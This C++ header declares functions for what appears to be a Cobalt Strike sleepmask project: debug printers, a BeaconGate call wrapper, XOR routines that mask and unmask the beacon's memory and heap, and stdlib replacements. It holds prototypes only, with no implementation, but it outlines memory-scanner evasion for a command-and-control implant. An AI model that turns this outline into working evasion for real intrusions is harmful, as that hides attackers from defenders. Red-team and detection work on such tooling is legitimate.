#pragma once
// Include bof-vs header files
#include "sleepmask.h"

/**
* Declare functions.
* 
* Note: This isn't explicitly required due to the #includes
* in sleepmask.cpp. However, it improves the UX as it improves
* intellisense.
*/

// debug.cpp
void PrintSleepMaskInfo(PBEACON_INFO info);
void PrintAllocatedMemoryRegion(PALLOCATED_MEMORY_REGION memoryRegion);
void PrintBeaconGateInfo(PFUNCTION_CALL functionCall);
void PrintSyscallInfo(PBEACON_SYSCALLS info);

// gate.cpp
void BeaconGateWrapper(PBEACON_INFO info, PFUNCTION_CALL gateFunction);
void BeaconGate(PFUNCTION_CALL gateFunction);

// masking.cpp
BOOL XORData(char* buffer, size_t size, char* key, size_t keyLength);
void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask);
void XORHeapRecords(BEACON_INFO* beaconInfo);
void XORBeacon(BEACON_INFO* beaconInfo, BOOL mask);
void MaskBeacon(BEACON_INFO* beaconInfo);
void UnMaskBeacon(BEACON_INFO* beaconInfo);

// stdlib.cpp 
BOOL _memcpy(void* dest, void* src, size_t size);
void* _memset(void* ptr, int byte, size_t size);
int _memcmp(const void* ptr1, const void* ptr2, size_t size);

// utils.cpp
PALLOCATED_MEMORY_REGION FindRegionByPurpose(PALLOCATED_MEMORY allocatedMemory, ALLOCATED_MEMORY_PURPOSE purpose);
